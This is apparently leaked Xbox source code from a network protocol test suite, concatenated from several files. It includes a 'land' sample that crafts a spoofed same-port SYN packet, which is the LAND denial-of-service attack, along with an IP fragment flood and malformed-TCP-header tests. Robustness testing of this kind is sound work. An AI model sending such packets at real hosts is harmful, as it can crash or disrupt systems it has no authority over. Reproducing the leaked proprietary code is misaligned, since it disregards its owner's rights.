        strcpy(szDestIPAddr, argv[1]);
    }

    try
    {
        CInterfaceList InterfaceList;

        if(InterfaceList.GetCount() == 1)
        {
            _tprintf(TEXT("Opening Interface: %s\n"),InterfaceList.GetNameAt(0));
        }
        else
        {
            _tprintf(TEXT("For this test it is recommended to unbind all but one of these adapters:\n"));
            for(DWORD i = 0; i < InterfaceList.GetCount(); i++)
            {
                _tprintf("%s  ",InterfaceList.GetNameAt(i));
            }
            _tprintf(TEXT("\n"));
            return 1;
        }

        CAutoArp AutoArp(InterfaceList.GetNameAt(0), szSrcIPAddr);

        CInterface Interface(InterfaceList.GetNameAt(0));

        MAC_MEDIA_TYPE MediaType = Interface.GetMediaType();

		CIPPacket IPPacket(MediaType);

        IPPacket.MacHeader.SetDestAddress(*(AutoArp.ResolveIpAddress(szDestIPAddr)));
        IPPacket.MacHeader.SetSrcAddress(*Interface.GetMediaAddress());
        IPPacket.MacHeader.SetProtocolType(0x800);
		IPPacket.IPHeader.SetVersion(4);
		IPPacket.IPHeader.SetHdrLength(20);
		IPPacket.IPHeader.SetTOS(0);
		IPPacket.IPHeader.SetDatagramLength(124);
		IPPacket.IPHeader.SetFlag(1);
		IPPacket.IPHeader.SetFragOffset(50);
		IPPacket.IPHeader.SetTTL(64);
		IPPacket.IPHeader.SetProtocolType(6);

		IPPacket.IPHeader.SetDestAddr(szDestIPAddr);
		IPPacket.IPHeader.SetSrcAddr(szSrcIPAddr);
		IPPacket.IPHeader.SetAutoCalcChecksum(ON);

        IPPacket.SetUserBuffer(testbuf,104,TRUE);

        for(USHORT usID = 1000; usID < 2000; usID++)
        {
			IPPacket.IPHeader.SetID(usID);
            Interface.Send(IPPacket);
        }
    }
    catch(CSpartaException *Ex)
    {
        _tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
        delete Ex;
    }

    return 0;
}

extern "C" void PrintDebug(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

extern "C" void LogDebugMessage(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\samples\land\land.cpp ===
#include "SpartaApi.h"

int __cdecl main(int argc, TCHAR *argv[])
{

    BOOL lQuit = FALSE;
    int iCount  = 1;
	CHAR  szDestIPAddr[20], szSrcIPAddr[] = "157.55.34.163";
	USHORT usDestPort = 0;
    UCHAR testbuf[100];       // this is a random buffer which we'll send
    memset(testbuf,0xef,104); 
    _stprintf((TCHAR*)testbuf,TEXT("This is a test buffer for send from SPARTA"));


    if(argc > 2)
    {
        strcpy(szDestIPAddr, argv[1]);
		if(atoi(argv[2]) < 0)
			goto USAGE;

        usDestPort = (USHORT) atoi(argv[2]);
    }
	else
		goto USAGE;

    try
    {
        CInterfaceList InterfaceList;

        if(InterfaceList.GetCount() == 1)
        {
            _tprintf(TEXT("Opening Interface: %s\n"),InterfaceList.GetNameAt(0));
        }
        else
        {
            _tprintf(TEXT("For this test it is recommended to unbind all but one of these adapters:\n"));
            for(DWORD i = 0; i < InterfaceList.GetCount(); i++)
            {
                _tprintf("%s  ",InterfaceList.GetNameAt(i));
            }
            _tprintf(TEXT("\n"));
            return 1;
        }

        CAutoArp AutoArp(InterfaceList.GetNameAt(0), szSrcIPAddr);

        CInterface Interface(InterfaceList.GetNameAt(0));

        MAC_MEDIA_TYPE MediaType = Interface.GetMediaType();

		CTCPPacket TCPPacket(MediaType);

		CMacAddress* pDestMacAddr = AutoArp.ResolveIpAddress(szDestIPAddr);

        TCPPacket.MacHeader.SetDestAddress(*pDestMacAddr);
        TCPPacket.MacHeader.SetSrcAddress(*pDestMacAddr);
        TCPPacket.MacHeader.SetProtocolType(0x800);
		TCPPacket.IPHeader.SetVersion(4);
		TCPPacket.IPHeader.SetHdrLength(20);
		TCPPacket.IPHeader.SetTOS(0);
		TCPPacket.IPHeader.SetDatagramLength(44);
		TCPPacket.IPHeader.SetID(1000);
		TCPPacket.IPHeader.SetFlag(0);
		TCPPacket.IPHeader.SetFragOffset(0);
		TCPPacket.IPHeader.SetTTL(64);
		TCPPacket.IPHeader.SetProtocolType(6);
		TCPPacket.IPHeader.SetDestAddr(szDestIPAddr);
		TCPPacket.IPHeader.SetSrcAddr("127.0.0.1");
		TCPPacket.IPHeader.SetAutoCalcChecksum(ON);

		TCPPacket.TCPHeader.SetSrcPort(usDestPort);
		TCPPacket.TCPHeader.SetDestPort(usDestPort);

		TCPPacket.TCPHeader.SetSeqNumber(1000);
		TCPPacket.TCPHeader.SetAckNumber(0);
		TCPPacket.TCPHeader.SetReserved(0);
		TCPPacket.TCPHeader.SetFlag(2);
		TCPPacket.TCPHeader.SetWindowSize(17520);
		TCPPacket.TCPHeader.SetUrgentPointer(0);

		TCPPacket.TCPHeader.Options[0].AddMSS(1460);

		TCPPacket.TCPHeader.SetAutoCalcChecksum(ON);
		TCPPacket.TCPHeader.SetAutoCalcLength(ON);

        Interface.Send(TCPPacket);
    }
    catch(CSpartaException *Ex)
    {
        _tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
        delete Ex;
    }

    return 0;

USAGE:
	
	_tprintf(TEXT("Usage: land <IPAddr of listening host> <Port of listening host>\n"));

	return -1;
}

extern "C" void PrintDebug(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

extern "C" void LogDebugMessage(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\tcp\client\tcptest.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "tcptest.h"

//==================================================================================
// Globals
//==================================================================================
// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( tcptest )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( tcptest )
    EXPORT_TABLE_ENTRY( "StartTest", TcpTestStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", TcpTestEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", TcpTestDllMain )
END_EXPORT_TABLE( tcptest )

// Test specific globals
static CRITICAL_SECTION g_csSerializeAccess;
static HANDLE g_hLog = INVALID_HANDLE_VALUE;
static PTCP_TEST_FUNCTION g_TestFunctions[TCPMSG_MAXTEST] = 
{
	TCPSeqNumMaxTest,													// TCPMSG_SEQNUM_MAX,
	TCPSeqNumMinTest,													// TCPMSG_SEQNUM_MIN,
	TCPDataOffBelowMinTest,												// TCPMSG_DATAOFF_BELOWMIN,
	TCPDataOffAboveAvailTest											// TCPMSG_DATAOFF_ABOVEAVAIL,
#if 0
	TCPReservedSetTest,													// TCPMSG_RESERVED_SET,
	TCPWindowMinTest,													// TCPMSG_WINDOW_MIN,
	TCPWindowMaxTest,													// TCPMSG_WINDOW_MAX,
	TCPChecksumBadTest,													// TCPMSG_CHECKSUM_BAD,
	TCPUrgentAfterEndTest,												// TCPMSG_URGENT_AFTEREND,
	TCPUrgentAtEndTest,													// TCPMSG_URGENT_ATEND,
	TCPUrgentBeforeEndTest,												// TCPMSG_URGENT_BEFOREEND,
	TCPUrgentMaxTest,													// TCPMSG_URGENT_MAX,
	TCPUrgentNoFlagTest,												// TCPMSG_URGENT_NOFLAG,
	TCPOptCutoffTest,													// TCPMSG_OPT_CUTOFF,
	TCPOptAtEndTest,													// TCPMSG_OPT_ATEND,
	TCPOptBeforeEndTest,												// TCPMSG_OPT_BEFOREEND,
	TCPOptNoOptsTest,													// TCPMSG_OPT_NOOPTIONS,
	TCPOptMaxOptsTest,													// TCPMSG_OPT_MAXOPTIONS,
	TCPOptMaxOptLenTest,												// TCPMSG_OPT_MAXOPTLEN,
	TCPOptEndOfOptsTest,												// TCPMSG_OPT_ENDOPTFIRST,
	TCPOptMssZeroTest,													// TCPMSG_OPT_MSSZERO,
	TCPOptMssOneTest,													// TCPMSG_OPT_MSSONE,
	TCPOptMssMaxTest,													// TCPMSG_OPT_MSSMAX,
	TCPConnSynAndNoAckTest,												// TCPMSG_CONN_SYNANDNOACK,
	TCPConnExtraSynTest,												// TCPMSG_CONN_EXTRASYN,
	TCPConnAckWrongSynTest,												// TCPMSG_CONN_ACKWRONGSYN,
	TCPConnSynAckWrongSynTest,											// TCPMSG_CONN_SYNACKWRONGSYN,
	TCPConnAckNoConnTest,												// TCPMSG_CONN_ACKNOCONN,
	TCPConnSynAckListenerTest,											// TCPMSG_CONN_SYNACKLISTENER,
	TCPShutFinAndNoAckTest,												// TCPMSG_SHUT_FINANDNOACK
#endif
};


static LPSTR g_TestNames[TCPMSG_MAXTEST] = 
{
	"TCP conn request with max seq num",								// TCPMSG_SEQNUM_MAX,
	"TCP conn request with min seq num",								// TCPMSG_SEQNUM_MIN,
	"TCP conn request with data off too small",							// TCPMSG_DATAOFF_BELOWMIN,
	"TCP conn request with data off too large"							// TCPMSG_DATAOFF_ABOVEAVAIL,
};


//==================================================================================
// TcpTestDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI TcpTestDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		InitializeCriticalSection(&g_csSerializeAccess);
		break;
	case DLL_PROCESS_DETACH:
		XNetRelease();
		DeleteCriticalSection(&g_csSerializeAccess);
		break;
	default:
		break;
	}

    return TRUE;
}

//==================================================================================
// TcpTestStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI TcpTestStartTest(IN HANDLE  hLog)
{
	NETSYNC_TYPE_CALLBACK CallbackSessionInfo;
	TCP_TESTREQ TestRequest;
	IN_ADDR ServerAddr;
    WSADATA WSAData;
	HANDLE hClientObject = NULL;
	DWORD dwTestDone;
	WORD LowPort, HighPort;
	INT i, nRet = 0;
	BYTE   MacAddr[6];
	DWORD  dwType = 0, dwSize = 0, dwErrorCode = 0;

	// Since we have to be thread safe, serialize entry for now
	EnterCriticalSection(&g_csSerializeAccess);

	g_hLog = hLog;

    // Set XLog info
	xSetOwnerAlias(g_hLog, "tristanj");
    xSetComponent(g_hLog, "Network(S)", "TCP/IP (S-n)");
	xSetFunctionName(g_hLog, "recvfrom");

    // Init winsock
    if(nRet = WSAStartup(MAKEWORD(2, 2), &WSAData))
	{
		xLog(g_hLog, XLL_FAIL, "Couldn't init winsock: %d", nRet);
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Winsock layer initialized");

	// Get the mac address
	dwErrorCode = XQueryValue(XC_FACTORY_ETHERNET_ADDR, &dwType, MacAddr, sizeof(MacAddr), &dwSize);
	if (ERROR_SUCCESS != dwErrorCode) {
		xLog(g_hLog, XLL_FAIL, "Couldn't get ethernet address: 0x%08x", dwErrorCode);
		goto Exit;
	}

	sprintf(TestRequest.MacAddr, "_%02x%02x%02x%02x%02x%02x",
		MacAddr[0], MacAddr[1], MacAddr[2], MacAddr[3], MacAddr[4], MacAddr[5]);
	xLog(g_hLog, XLL_INFO, "Local ethernet address: %s", TestRequest.MacAddr);

	// Prepare to find a server that can run the TCP tests
	CallbackSessionInfo.byMinClientCount = 0;
	CallbackSessionInfo.byMaxClientCount = 0;
	CallbackSessionInfo.nMinPortCount = 1;
	CallbackSessionInfo.lpszDllName_W = TCP_SERVER_DLL_W;
	CallbackSessionInfo.lpszMainFunction_A = TCP_SERVER_MAIN_FUNCTION_A;
	CallbackSessionInfo.lpszStartFunction_A = TCP_SERVER_START_FUNCTION_A;
	CallbackSessionInfo.lpszStopFunction_A = TCP_SERVER_STOP_FUNCTION_A;

	// Create a client to communicate with that server
	hClientObject = NetsyncCreateClient(0, NETSYNC_SESSION_CALLBACK, &CallbackSessionInfo, &ServerAddr.S_un.S_addr, NULL, &LowPort, &HighPort);
	if (hClientObject == INVALID_HANDLE_VALUE)
	{
		xLog(g_hLog, XLL_FAIL, "Couldn't create Netsync client");
		goto Exit;
	}

	DbgPrint("TCPTEST: Starting tests...\n");

	// Run the tests
	for(i = 0; i < TCPMSG_MAXTEST; ++i)
	{
		IN_ADDR FromAddr;
		DWORD dwReceiveStatus, dwSendResult;

		TestRequest.dwMessageId = TCPMSG_TESTREQ;
		TestRequest.TestId = (TCPMSG_TESTTYPES) i;

		xStartVariation(g_hLog, g_TestNames[i]);
		xLog(g_hLog, XLL_INFO, "Started test %u", i);

		// Send the test request to the Netsync server
		dwSendResult = NetsyncSendClientMessage(hClientObject, 0, sizeof(TCP_TESTREQ), (char *) &TestRequest);
		if(dwSendResult != WAIT_OBJECT_0)
		{
			xLog(g_hLog, XLL_INFO, "Error sending message to TCP server");
			DbgPrint("TCPTEST: Error during test, aborting...\n");
			goto Exit;
		}

		// If we get here, then the Netsync server successfully acked the test.
		// Now run the client side of the test

		if(g_TestFunctions[i](LowPort, HighPort))
			xLog(g_hLog, XLL_PASS, "Test passed!");
		else
			xLog(g_hLog, XLL_FAIL, "Test failed!");

		xEndVariation(g_hLog);

		Sleep(5000);
	}

	DbgPrint("TCPTEST: Tests complete\n");

Exit:

	// Tell the netsync server we're done
	dwTestDone = TCPMSG_TESTDONE;
	NetsyncSendClientMessage(hClientObject, 0, 4, (char *) &dwTestDone);
	
	hClientObject ? NetsyncCloseClient(hClientObject) : 0;

	// Clean up winsock
	xLog(g_hLog, XLL_INFO, "Cleaning up Winsock layer");
	WSACleanup();

	g_hLog = INVALID_HANDLE_VALUE;

	// Allow other threads to enter now
	LeaveCriticalSection(&g_csSerializeAccess);

}            

//==================================================================================
// TcpTestEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI TcpTestEndTest()
{
	// We already cleaned up everything at the end of StartTest
}

//==================================================================================
// IsSocketReady
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//	SOCKET			Socket				Socket to monitor for a given state
//	SOCKET_STATE	SocketState			State to monitor for
// Returns:
//	Returns TRUE if the activity has occured, FALSE otherwise
//==================================================================================
static BOOL IsSocketReady(SOCKET Socket, SOCKET_STATE SocketState, DWORD dwSecondsToWait)
{
	fd_set SocketCollection, *ReadCollection, *WriteCollection, *ExceptCollection;
	timeval TimeOut = {0,0}, *pTimeOut = NULL;

	// If we have a bad socket, just report FALSE
	if(Socket == INVALID_SOCKET)
		return FALSE;

	if(dwSecondsToWait != TIME_INFINITY)
	{
		TimeOut.tv_sec = dwSecondsToWait;
		pTimeOut = &TimeOut;
	}

	FD_ZERO(&SocketCollection);
	FD_SET(Socket, &SocketCollection);

	// Depending on the activity to monitor for, setup the parameters to select
	switch(SocketState)
	{
	case READABLE:
		ReadCollection = &SocketCollection;
		WriteCollection = NULL;
		ExceptCollection = NULL;
		break;
	case WRITEABLE:
		ReadCollection = NULL;
		WriteCollection = &SocketCollection;
		ExceptCollection = NULL;
		break;
	default:
		ReadCollection = NULL;
		WriteCollection = NULL;
		ExceptCollection = &SocketCollection;
		break;
	}

	if((select(1, ReadCollection, WriteCollection, ExceptCollection, pTimeOut)) != 1)
		return FALSE;
	else
		return TRUE;
}

//==================================================================================
// AcceptIncomingConnection
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with with a certain set of properties
//
// Arguments:
//	WORD			LocalPort			Port to receive the packet on
//	WORD			ExpectedRemotePort	Remote port that should be reported for packet
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL AcceptIncomingConnection(WORD LocalPort, WORD ExpectedRemotePort)
{
	SOCKET ListenerSocket = INVALID_SOCKET, AcceptedConnection = INVALID_SOCKET;
	SOCKADDR_IN LocalAddress, RemoteAddress;
	LINGER LingerOption;
	DWORD dwBytesAvailable = 0, dwBufferSize = 0, dwBytesReceived = 0;
	BOOL fPassed = TRUE;
	INT nRemoteAddressSize = sizeof(SOCKADDR_IN);

	// Create the socket
	ListenerSocket = socket(AF_INET, SOCK_STREAM, 0);
	if(ListenerSocket == INVALID_SOCKET)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't create socket!");
		fPassed = FALSE;
		goto Exit;
	}

	// Setup the local binding info
	LocalAddress.sin_addr.s_addr = INADDR_ANY;
	LocalAddress.sin_family = AF_INET;
	LocalAddress.sin_port = htons(LocalPort);

	// Bind the socket
	if(bind(ListenerSocket, (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't bind socket!");
		fPassed = FALSE;
		goto Exit;
	}

	LingerOption.l_linger = 0;
	LingerOption.l_onoff = TRUE;

	// Set socket for hard-close so the other-side will terminate on a close
	if(setsockopt(ListenerSocket, SOL_SOCKET, SO_LINGER, (const char *) &LingerOption, sizeof(LINGER)) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't set socket for hard closes: %u", WSAGetLastError());
		fPassed = FALSE;
		goto Exit;
	}

	// Listen to the socket
	if(listen(ListenerSocket, SOMAXCONN) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't listen to socket!");
		fPassed = FALSE;
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Listening to socket bound to port 0x%04x", LocalPort);

	// Wait for the socket to receive an incoming connection (i.e. select will say it is readable)
	if(!IsSocketReady(ListenerSocket, READABLE, 10))
	{
		xLog(g_hLog, XLL_INFO, "Winsock reported no pending connections");
		fPassed = FALSE;
		goto Exit;
	}

	if((AcceptedConnection = accept(ListenerSocket, (struct sockaddr *) &RemoteAddress, &nRemoteAddressSize)) == INVALID_SOCKET)
	{
		xLog(g_hLog, XLL_INFO, "Couldn't accept incoming connection");
		fPassed = FALSE;
		goto Exit;
	}

	// Is the reported port correct?
	if(ntohs(RemoteAddress.sin_port) != ExpectedRemotePort)
	{
		xLog(g_hLog, XLL_INFO, "Reported destination port (%u) didn't match expected value (%u)", ntohs(RemoteAddress.sin_port), ExpectedRemotePort);
		fPassed = FALSE;
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Connection accepted successfully");

Exit:

	(AcceptedConnection != INVALID_SOCKET) ? closesocket(AcceptedConnection) : 0;
	(ListenerSocket != INVALID_SOCKET) ? closesocket(ListenerSocket) : 0;

	return fPassed;
}

//==================================================================================
// TCPSeqNumMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can accept an incoming connection with max seq num
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPSeqNumMaxTest(WORD LowPort, WORD HighPort)
{
	return AcceptIncomingConnection(LowPort, LowPort);
}

//==================================================================================
// TCPSeqNumMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can accept an incoming connection with min seq num
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPSeqNumMinTest(WORD LowPort, WORD HighPort)
{
	return AcceptIncomingConnection(LowPort, LowPort);
}

//==================================================================================
// TCPDataOffBelowMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can accept an incoming connection with data offset
// below minimum valid value
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffBelowMinTest(WORD LowPort, WORD HighPort)
{
	return !AcceptIncomingConnection(LowPort, LowPort);
}

//==================================================================================
// TCPDataOffAboveAvailTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can accept an incoming connection with data offset
// larger than the number of bytes in the header
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffAboveAvailTest(WORD LowPort, WORD HighPort)
{
	return !AcceptIncomingConnection(LowPort, LowPort);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\tcp\client\tcptest.h ===
#ifndef __TCPTEST_H__
#define __TCPTEST_H__

//==================================================================================
// Includes
//==================================================================================
#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <xtl.h>
#include <xnetref.h>
#include <xlog.h>
#include <xtestlib.h>
#include <netsync.h>
#include <xlog.h>
#include <xboxp.h>
#include <stdio.h>

#include "tcpmsg.h"

//==================================================================================
// Defines
//==================================================================================
#define TCP_SERVER_DLL_W L"tcpserv.dll"
#define TCP_SERVER_MAIN_FUNCTION_A "TcpServerCallbackFunction"
#define TCP_SERVER_START_FUNCTION_A "TcpServerStartFunction"
#define TCP_SERVER_STOP_FUNCTION_A "TcpServerStopFunction"

#define MAX_REQUEST_RETRIES 5
#define RETRY_TIMEOUT 3000
#define SIM_REASM_MAX 4
#define TIME_INFINITY 10000

//==================================================================================
// Typedefs
//==================================================================================

// TCP test function
typedef BOOL (*PTCP_TEST_FUNCTION)(WORD LowPort, WORD HighPort);

// States that sockets can be monitored for
typedef enum _SOCKET_STATE
{
	READABLE,
	WRITEABLE,
	EXCEPTION
} SOCKET_STATE;

//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI TcpTestDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI TcpTestStartTest(IN HANDLE hLog);
VOID WINAPI TcpTestEndTest();

// Test case functions
BOOL TCPSeqNumMaxTest(WORD LowPort, WORD HighPort);
BOOL TCPSeqNumMinTest(WORD LowPort, WORD HighPort);
BOOL TCPDataOffBelowMinTest(WORD LowPort, WORD HighPort);
BOOL TCPDataOffAboveAvailTest(WORD LowPort, WORD HighPort);
#if 0
BOOL TCPReservedSetTest(WORD LowPort, WORD HighPort);
BOOL TCPWindowMinTest(WORD LowPort, WORD HighPort);
BOOL TCPWindowMaxTest(WORD LowPort, WORD HighPort);
BOOL TCPChecksumBadTest(WORD LowPort, WORD HighPort);
BOOL TCPUrgentAfterEndTest(WORD LowPort, WORD HighPort);
BOOL TCPUrgentAtEndTest(WORD LowPort, WORD HighPort);
BOOL TCPUrgentBeforeEndTest(WORD LowPort, WORD HighPort);
BOOL TCPUrgentMaxTest(WORD LowPort, WORD HighPort);
BOOL TCPUrgentNoFlagTest(WORD LowPort, WORD HighPort);
BOOL TCPOptCutoffTest(WORD LowPort, WORD HighPort);
BOOL TCPOptAtEndTest(WORD LowPort, WORD HighPort);
BOOL TCPOptBeforeEndTest(WORD LowPort, WORD HighPort);
BOOL TCPOptNoOptsTest(WORD LowPort, WORD HighPort);
BOOL TCPOptMaxOptsTest(WORD LowPort, WORD HighPort);
BOOL TCPOptMaxOptLenTest(WORD LowPort, WORD HighPort);
BOOL TCPOptEndOfOptsTest(WORD LowPort, WORD HighPort);
BOOL TCPOptMssZeroTest(WORD LowPort, WORD HighPort);
BOOL TCPOptMssOneTest(WORD LowPort, WORD HighPort);
BOOL TCPOptMssMaxTest(WORD LowPort, WORD HighPort);
BOOL TCPConnSynAndNoAckTest(WORD LowPort, WORD HighPort);
BOOL TCPConnExtraSynTest(WORD LowPort, WORD HighPort);
BOOL TCPConnAckWrongSynTest(WORD LowPort, WORD HighPort);
BOOL TCPConnSynAckWrongSynTest(WORD LowPort, WORD HighPort);
BOOL TCPConnAckNoConnTest(WORD LowPort, WORD HighPort);
BOOL TCPConnSynAckListenerTest(WORD LowPort, WORD HighPort);
BOOL TCPShutFinAndNoAckTest(WORD LowPort, WORD HighPort);
#endif

#endif // __TCPTEST_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\tcp\inc\tcpmsg.h ===
#ifndef __TCPMSG_H__
#define __TCPMSG_H__

//***************
//*** Defines ***
//***************

#define TCPMSG_TESTREQ		NETSYNC_MSG_USER + 1
#define TCPMSG_TESTACK		NETSYNC_MSG_USER + 2
#define TCPMSG_TESTDONE		NETSYNC_MSG_USER + 3

#define UDPHEADER_SIZE		8
#define	IPHEADER_SIZE		20
#define TCPHEADER_SIZE		20

//****************
//*** Typedefs ***
//****************

// TCP test case IDs
typedef enum _TCPMSG_TESTTYPES
{
	// Tests for sequence number field
	TCPMSG_SEQNUM_MAX,
	TCPMSG_SEQNUM_MIN,

	// Tests for data offset field
	TCPMSG_DATAOFF_BELOWMIN,
	TCPMSG_DATAOFF_ABOVEAVAIL,

#if 0
	// Tests for the reserved field
	TCPMSG_RESERVED_SET,

	// Tests for the window field
	TCPMSG_WINDOW_MIN,
	TCPMSG_WINDOW_MAX,

	// Tests for the checksum field
	TCPMSG_CHECKSUM_BAD,

	// Tests for the urgent pointer field
	TCPMSG_URGENT_AFTEREND,
	TCPMSG_URGENT_ATEND,
	TCPMSG_URGENT_BEFOREEND,
	TCPMSG_URGENT_MAX,
	TCPMSG_URGENT_NOFLAG,

	// Tests for TCP options
	TCPMSG_OPT_CUTOFF,
	TCPMSG_OPT_ATEND,
	TCPMSG_OPT_BEFOREEND,
	TCPMSG_OPT_NOOPTIONS,
	TCPMSG_OPT_MAXOPTIONS,
	TCPMSG_OPT_MAXOPTLEN,
	TCPMSG_OPT_ENDOPTFIRST,
	TCPMSG_OPT_MSSZERO,
	TCPMSG_OPT_MSSONE,
	TCPMSG_OPT_MSSMAX,

	// Tests for connection establishment
	TCPMSG_CONN_SYNANDNOACK,
	TCPMSG_CONN_EXTRASYN,
	TCPMSG_CONN_ACKWRONGSYN,
	TCPMSG_CONN_SYNACKWRONGSYN,
	TCPMSG_CONN_ACKNOCONN,
	TCPMSG_CONN_SYNACKLISTENER,

	// Tests for connection shutdown
	TCPMSG_SHUT_FINANDNOACK,
#endif

	TCPMSG_MAXTEST
} TCPMSG_TESTTYPES, *PTCPMSG_TESTTYPES;

// TCP test request packet
typedef struct _TCP_TESTREQ {
    DWORD				dwMessageId;	// Specifies the message id
	TCPMSG_TESTTYPES	TestId;			// Specifies the test requested
	CHAR				MacAddr[16];	// Specifies the MAC address of the client (make size a multiple of 4)
} TCP_TESTREQ, *PTCP_TESTREQ;

// TCP test request ack
typedef struct _TCP_TESTACK {
    DWORD				dwMessageId;	// Specifies the message id
	TCPMSG_TESTTYPES	TestId;			// Specifies the test requested
	CHAR				SpoofIp[16];	// Specifies the IP address that the server will spoof
} TCP_TESTACK, *PTCP_TESTACK;

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\myaddr\myaddr.c ===
#include <windows.h>
#include <winsock2.h>

u_long
GetMyAddr(
)
{
    // hostname is the host name
    char            *hostname = NULL;
    // hostaddr is the host address
    u_long          hostaddr = 0;
    // hostnamelen is the length of the host name buffer
    int             hostnamelen = 0x10;
    // hostent is a pointer to the returned host information
    struct hostent  *hostent = NULL;
    // iResultCode is the result code from gethostname()
    int             iResultCode = 0;
    // iErrorCode is the last error code
    int             iErrorCode = ERROR_SUCCESS;

    do {
        if (NULL == hostname) {
            // Allocate the memory for the standard host name
            hostname = (char *) LocalAlloc(LPTR, hostnamelen);
        }
        else {
            // Increase the memory for the standard host name and reallocate
            hostnamelen += 0x10;
            hostname = (char *) LocalReAlloc(hostname, hostnamelen, LMEM_ZEROINIT);
        }

        if (NULL == hostname) {
            // Get the last error code
            iErrorCode = GetLastError();

            goto FunctionFailed0;
        }

        iResultCode = gethostname(hostname, hostnamelen);
    } while ((SOCKET_ERROR == iResultCode) && (WSAEFAULT == WSAGetLastError()));

    if (SOCKET_ERROR == iResultCode) {
        // Get the last error code
        iErrorCode = WSAGetLastError();

        goto FunctionFailed0;
    }

    // Get the host information for the local machine
    hostent = gethostbyname(hostname);
    if (NULL == hostent) {
        // Get the last error code
        iErrorCode = WSAGetLastError();

        goto FunctionFailed0;
    }

    // Get the host address for the local machine
    CopyMemory(&hostaddr, hostent->h_addr, sizeof(hostaddr));

FunctionFailed0:
    // Free the standard host name
    LocalFree(hostname);

    if (ERROR_SUCCESS != iErrorCode) {
        // Set the last error code
        SetLastError(iErrorCode);
    }

    return hostaddr;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\tcp\server\tcpserv.cpp ===
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include "tcpserv.h"

BYTE g_bLocalSpoofIpNextHost = LOCAL_SPOOF_IP_BASE_HOST;

PTCP_SERV_FUNCTION	g_ServerFunctions[TCPMSG_MAXTEST] = 
{
	TCPSeqNumMaxServ,													// TCPMSG_SEQNUM_MAX,
	TCPSeqNumMinServ,													// TCPMSG_SEQNUM_MIN,
	TCPDataOffBelowMinServ,												// TCPMSG_DATAOFF_BELOWMIN,
	TCPDataOffAboveAvailServ											// TCPMSG_DATAOFF_ABOVEAVAIL,
#if 0
	TCPReservedSetServ,													// TCPMSG_RESERVED_SET,
	TCPWindowMinServ,													// TCPMSG_WINDOW_MIN,
	TCPWindowMaxServ,													// TCPMSG_WINDOW_MAX,
	TCPChecksumBadServ,													// TCPMSG_CHECKSUM_BAD,
